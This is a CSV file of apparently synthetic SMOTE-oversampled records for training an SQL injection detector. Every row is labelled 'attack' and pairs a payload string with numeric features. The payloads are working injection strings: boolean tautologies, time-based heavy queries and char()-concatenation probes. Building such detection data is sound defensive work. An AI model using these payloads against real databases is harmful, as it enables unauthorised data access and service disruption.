id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000086,attack,boolean,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",nearest_attack_euclidean,R000034,1.3545219088826734,374.9606276595937,42.0,3.6868020044733063,117.92283404255829,35.0,165.30708510639576,56.73070851063958,0.3145092595511464,0.09337309020205155,0.4407927151302753,0.15132493511652675,2.9228340425583017,1.0771659574416983,0.0,0.0,0.0,1.2692914893604246,0.0,35.461417021279146,0.0,2.0,4.0,11.269291489360423,0.7307085106395753,0.2692914893604247,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,12.0
SMOTE_000087,attack,boolean,-3339' or 8571  =  8571--,nearest_attack_euclidean,R000170,1.164154432960267,24.35122014325482,12.324389928372598,3.342065895743834,2.0,12.0,6.0,4.351220143254801,0.08225662558867897,0.4935397535320737,0.24676987676603684,0.1774337441132105,1.0,0.0,2.3512201432548023,0.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,3.351220143254802,1.0,0.0,0.6756100716274009,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000088,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000205,1.9086561482699482,28.403898208239212,17.19220358352156,3.6545243236313434,4.384407167043122,12.0,8.211694624717659,3.8077964164784355,0.1555911470785373,0.42260248953341056,0.2883006921606155,0.13350567122743665,0.40389820823921807,0.0,1.0,0.0,0.0,1.0,0.0,0.4038982082392195,0.0,-1.1102230246251565e-16,0.0,2.0,0.40389820823921796,0.0,0.0,1.0000000000000002,0.0,1.0,0.40389820823921796,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000089,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,0.5622632337484363,93.42549510563153,29.40728431589472,3.749565595192885,32.0,13.0,35.81456863178944,12.610926473842081,0.34281775983967844,0.13926971493486937,0.38318489080231943,0.13472763442313276,0.20364215794736062,0.0,2.0,0.0,1.0,1.0,0.0,6.20364215794736,0.20364215794736062,1.0,1.0,4.0,0.20364215794736062,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,boolean,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,nearest_attack_euclidean,R000002,1.14900103324999,58.3671500122541,22.0,3.6302655604445246,26.0,4.632849987745903,19.367150012254093,8.367150012254097,0.44548629447147675,0.07944755968088602,0.33177055829278485,0.14329558755485236,0.0,0.7343000245081927,2.0,0.0,1.0,2.0,0.0,0.0,0.3671500122540963,-1.1102230246251565e-16,0.0,5.632849987745904,0.0,0.36715001225409627,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000091,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000164,1.4127401431919056,148.1853032154436,31.998814775439,3.8384906369124905,52.39549614666821,15.199525910175602,55.79336274245841,24.796918416141406,0.35584557831833474,0.10594975425783892,0.37290196526639496,0.16530270215743134,0.0,3.0,0.0,0.0,0.0,1.0,0.0,12.198340685614603,1.0,1.5997629550878005,3.5997629550878,3.3990518203512017,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.5997629550878004,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.199525910175601,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.199525910175601
SMOTE_000092,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000005,2.6359020922504874,27.084517030908742,10.549289781454753,3.0309458721849083,14.35213065563574,0.36619318763650455,6.816903406181751,5.5492897814547515,0.522526996682082,0.015921442940717484,0.2519901803675897,0.2095613800096108,4.1830965938182505,0.0,0.0,0.18309659381825097,0.18309659381825108,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.3661931876365023,1.0,0.0,0.0,0.0,0.18309659381825108,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000093,attack,boolean,"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000139,1.8295739111208131,143.36287088353853,28.94758188909467,3.637815620986427,51.31248071903259,11.421372833642007,56.89313583178996,23.73588149907398,0.34967915037376496,0.0844192286133247,0.4005964225777015,0.1653051984352088,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.052418110905329,2.0,3.1048362218106567,2.5786271663579923,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000094,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000238,1.053416739238801,153.92553604321722,34.49255360432172,4.053568983576462,60.66436644969981,20.261169593517415,50.768615989195695,22.23138401080431,0.3918861887386651,0.13246010930965937,0.3315355191669458,0.14411818278472976,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.507446395678277,0.0,1.9851072086434463,1.7388304064825846,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,2.0,0.0,1.0,1.7537231978391383,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.753723197839138
SMOTE_000095,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""cuzi"" like ""cuzi",nearest_attack_euclidean,R000101,0.6966109125562572,170.1800833360415,32.50468794349289,4.028074601174691,73.48593616952132,14.514063830478676,56.78984751968958,25.3902358163519,0.4390661894662071,0.08349162706076389,0.32959073643264786,0.1478514470403812,0.0,3.0,0.0,0.0,0.12382801412677685,0.0,0.0,12.637891844605456,0.0,1.7523439717464462,3.8761719858732233,3.628515957619669,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.8761719858732231,0.12382801412677691,0.0,0.0,0.12382801412677691,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.628515957619669,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8761719858732233
SMOTE_000096,attack,boolean,"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000123,0.016788861320236426,233.37996334876397,37.0,3.7657535029843103,71.0,25.0,94.30397067901117,43.07599266975279,0.30423454759328017,0.10712484070185921,0.4040665887659283,0.1845740229389323,0.0,1.0,2.0,0.0,0.0,1.0,0.0,22.075992669752793,1.0,2.0,4.0,13.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000097,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000099,0.8818287616840337,129.09409682371697,29.51764315444693,4.050523925948361,64.7823457831527,12.02352420592924,33.03528630889386,19.252940525741156,0.5034748466856277,0.09149816132881049,0.25465601137928207,0.1503709806062798,1.0,0.0,2.0,0.0,1.0,1.2529405257411548,0.0,4.252940525741154,0.7470594742588451,5.0,4.0,4.252940525741155,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.25294052574115494,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.252940525741155
SMOTE_000098,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000012,1.6187364648454992,26.675585277327784,10.882943148448152,2.951435172789832,12.026755831983323,0.8829431484481489,8.324414722672223,5.441471574224073,0.44277114122612665,0.03531772593792601,0.3162207361336113,0.20569039670233602,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.44147157422407446,0.0,-1.1102230246251565e-16,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.44147157422407507,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000099,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000050,1.2015047497569633,130.1122072658717,30.112207265871685,3.9737771083228663,65.0,8.0,41.0,16.112207265871685,0.49959799560437546,0.06148898407438466,0.31513104338122144,0.12378197694001847,0.5561036329358431,0.0,2.0,0.0,1.0,1.0,0.0,6.0,0.5561036329358431,-1.1102230246251565e-16,2.0,4.0,0.5561036329358431,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000100,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",nearest_attack_euclidean,R000068,0.7860019709554478,120.1243098185471,29.14053872731839,4.078510901722041,75.04143660618237,3.380179575772795,27.562154909273556,14.14053872731839,0.6273372810377611,0.028016483380389673,0.22699633427445987,0.11764990130738931,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7603591515455923,0.6198204242272037,-1.1102230246251565e-16,2.380179575772796,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000256,2.24829016951673,378.8433925065656,30.514930108981112,3.329183734421432,98.36562901916997,52.66423119879224,175.29860217962226,52.514930108981105,0.2602481410036968,0.1387000167829817,0.46234491187268945,0.138706930340632,0.0,1.9402795640755486,0.5149301089811129,0.0,0.0,3.0,0.0,36.05972043592445,0.0,-1.1102230246251565e-16,1.0,13.514930108981112,0.0,0.4850698910188872,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.485069891018887,0.5149301089811128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000102,attack,boolean,1' where 7882  =  7882 and 6663  =  4524--,nearest_attack_euclidean,R000168,0.9361704796565372,42.264741052411495,18.20577684276544,3.653845015059969,7.735258947588477,17.79422315723456,12.0,4.7352589475884805,0.18314670397531782,0.4207401853338071,0.2839552089540763,0.11215790173679877,1.0,0.0,1.7352589475884805,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,3.7352589475884805,1.0,0.0,0.7352589475884808,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.7352589475884806,0.2647410524115193,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000103,attack,boolean,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,nearest_attack_euclidean,R000002,0.5922930170764183,56.850228217165494,22.287442945708626,3.6688215449801165,25.42511410858275,4.7125570542913735,18.425114108582747,8.287442945708625,0.4471745481007332,0.08271940231898858,0.32391516033577744,0.14619088924450072,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.7125570542913748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.712557054291374
SMOTE_000104,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000197,0.2471730643979226,145.92983691313643,32.805424893297534,4.068684254571991,70.41627467989261,8.902712446648767,46.805424893297534,19.805424893297534,0.48250169853499025,0.06099090623445082,0.32081308145244725,0.1356943137781117,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,1.0,-1.1102230246251565e-16,2.902712446648767,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.09728755335123329,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000259,1.2442407455991955,162.22546288503932,30.628051777856342,3.9370516939753126,98.27429133074077,9.487792888574637,38.71948222143659,15.74389644428732,0.6044224288828903,0.05801807976663907,0.23937515252268615,0.0981843388277844,4.0,0.0,0.0,0.0,1.0,1.3719482221436594,0.0,4.0,0.0,-1.1102230246251565e-16,3.4877928885746377,2.3719482221436596,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000106,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000069,1.459346079445221,152.17092580803785,32.0,4.050007174489109,78.91453709598107,8.0,47.213657260047306,18.042731452009463,0.5214195529407176,0.05271842853887575,0.30765808986759596,0.11820392865281062,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.042731452009461,0.0,-1.1102230246251565e-16,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.4893171369976348,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000107,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000076,1.2669386825508386,140.60092219066973,30.199538904665125,4.025703679374003,73.40599423935333,10.0,38.39677233265589,18.79815561866051,0.5218927037735558,0.07112560733166502,0.2732134689448288,0.1337682199499503,1.0,0.0,0.39907780933025494,0.0,1.0,1.0,0.0,5.3990778093302545,0.19953890466512747,5.0,4.0,2.399077809330255,1.0,0.0,0.1995389046651275,0.8004610953348725,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000171,0.47227697314176914,63.66234598301958,21.441563988679718,3.2975190574541386,5.662345983019577,16.0,28.0,14.0,0.0886041527212928,0.2514195440768847,0.4399842021345483,0.21999210106727415,4.0,0.0,1.0,0.0,0.7792180056601414,2.0,0.0,4.0,2.0,-1.1102230246251565e-16,0.22078199433985835,3.779218005660142,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000109,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000294,1.8264879732037669,142.17483498511902,33.65458355067356,4.184359895140245,70.96375065202068,14.247333681077691,35.840083811481826,21.123666840538846,0.5010534311211077,0.0981775798791131,0.25139575693889404,0.14937323206088512,2.061833420269423,0.0,2.0,0.0,1.0,1.5309167101347114,0.0,4.530916710134711,0.4690832898652886,5.0,4.0,5.061833420269423,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.5309167101347114,0.0,0.5309167101347114,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.061833420269423
SMOTE_000110,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000091,0.6086601969643538,82.68619913016765,26.421549782541913,3.3933623154957875,12.144612554364521,16.0,38.264649347625735,16.27693722817739,0.14800642413622722,0.19454745335333634,0.4612186239286414,0.19622749858179508,0.0,3.9999999999999996,1.0,0.0,0.14461255436452214,2.0,0.0,5.7107748912709555,1.7107748912709555,0.8553874456354779,0.8553874456354779,3.1446125543645222,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000111,attack,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000285,0.06251829802815671,142.856032085873,32.928016042936505,4.143495392035874,71.9760053476455,8.976005347645502,42.952010695291,18.952010695291005,0.5038504647302563,0.06282805757441937,0.3006650068773454,0.132656470817979,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,1.0,-1.1102230246251565e-16,2.976005347645502,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.976005347645502,0.023994652354498047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000084,0.5770098098758083,200.16513096191753,34.520641370239694,3.821978045674941,58.735471234132305,32.0,77.90901835754553,31.52064137023969,0.2931989772045601,0.1601742998427328,0.38909131829715193,0.1575354046555551,1.1735471234132304,0.0,1.6529057531735392,0.0,0.0,2.0,0.0,16.34709424682646,0.0,1.0,3.0,10.0,1.0,0.0,0.8264528765867696,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.17354712341323048,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.173547123413231
SMOTE_000113,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000187,1.1260675692648445,60.581012467838306,23.36497922026949,3.7290606468941006,15.891983376215599,17.0,20.689029091622714,7.0,0.2633047552694452,0.28078807765083347,0.34028854687055465,0.11561862020916672,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.527004155946102,0.0,-1.1102230246251565e-16,0.0,4.472995844053898,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.47299584405389794,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.472995844053898
